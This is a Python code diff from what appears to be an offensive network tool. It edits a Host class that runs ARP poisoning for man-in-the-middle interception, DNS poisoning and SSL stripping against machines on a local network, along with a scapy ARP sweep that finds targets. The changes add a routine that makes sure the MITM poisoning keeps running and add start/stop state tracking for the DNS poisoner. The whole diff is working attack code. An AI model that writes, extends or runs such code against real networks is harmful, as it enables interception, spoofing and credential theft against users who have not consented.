@@ -15,6 +15,7 @@ class Host():
         self.arp_attack     = None
         self.arp_started    = False
         self.dns_poisoner   = DnsPoisoner(ip, dns_queue_num)
+        self.dns_started    = False
         self.ssl_remover    = SslRemover(ip, dns_queue_num + 1)
         self.seen_this_scan = True
 
@@ -35,6 +36,32 @@ class Host():
         self.arp_poisoner.add_packet(other_mac, gateway_mac, self.ip, gateway_ip)
         self.arp_attack = "mitm"
 
+    # ensure that mitm arp poisoning attack is running against this host
+    def arp_ensure_mitm(self, gateway_ip, gateway_mac, other_mac):
+
+        # if attack is currently running
+        if self.arp_poisoner.is_alive():
+
+            # mitm attack is already running, so do nothing
+            if self.arp_attack == "mitm":
+                pass
+
+            # one-way attack is running, so stop it and run mitm attack instead
+            else:
+                self.arp_stop()
+                self.arp_mitm(gateway_ip, gateway_mac, other_mac)
+                self.arp_start()
+
+        else:
+
+            # mitm attack is prepared but not running, so just start it
+            if self.arp_attack == "mitm":
+                self.arp_start()
+
+            else:
+                self.arp_mitm(gateway_ip, gateway_mac, other_mac)
+                self.arp_start()
+
     # starts currently prepared arp poisoning attack
     def arp_start(self):
 
@@ -43,13 +70,14 @@ class Host():
 
         else:
             self.arp_poisoner.start()
-
-        self.arp_started = True
+            self.arp_started = True
 
     # stops currently running arp poisoning attack
     def arp_stop(self):
 
-        self.arp_poisoner.stop()
+        if self.arp_started:
+            self.arp_poisoner.stop()
+            self.arp_started = False
 
     def dns_add(self, url, ip):
 
@@ -57,25 +85,23 @@ class Host():
 
     def dns_start(self):
 
-        self.dns_poisoner.start()
+        if self.dns_started:
+            self.dns_poisoner.run()
+
+        else: 
+            self.dns_poisoner.start()
+            self.dns_started = True
 
     def dns_stop(self):
 
-        self.dns_poisoner.stop()
-
-    def ssl_start(self):
-
-        self.ssl_remover.start()
-
-    def ssl_stop(self):
-
-        self.ssl_remover.stop()
+        if self.dns_started:
+            self.dns_poisoner.stop()
+            self.dns_started = False
 
     def remove(self):
 
         self.arp_poisoner.stop()
         self.dns_poisoner.stop()
-        self.ssl_remover.stop()
 
 # scan on specified range and interface, return found gateway and hosts
 def get_hosts(interface, range_, timeout, gateway, hosts):
@@ -101,7 +127,7 @@ def get_hosts(interface, range_, timeout, gateway, hosts):
     packet  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range_)
 
     # send the packet and store replies
-    results = srp(packet, timeout=timeout, iface=interface, verbose=1)[0]
+    results = srp(packet, timeout=timeout, iface=interface, verbose=0)[0]
     replies = [result[1][ARP] for result in results]
 
     for reply in replies:
